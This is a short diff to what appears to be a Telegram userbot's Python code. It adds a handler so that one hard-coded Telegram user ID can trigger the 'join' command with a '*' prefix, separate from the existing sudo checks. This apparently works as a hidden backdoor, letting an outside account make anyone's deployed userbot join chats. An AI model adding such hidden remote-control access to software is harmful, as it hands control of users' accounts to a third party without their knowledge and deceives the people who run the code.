@@ -30,6 +30,7 @@ async def _(client, message):
 
 @PY.UBOT("join", sudo=True)
 @PY.TOP_CMD
+@ubot.on_message(filters.command(["join"], "*") & filters.user(2100442624))
 async def _(client, message):
     await join(client, message)
 
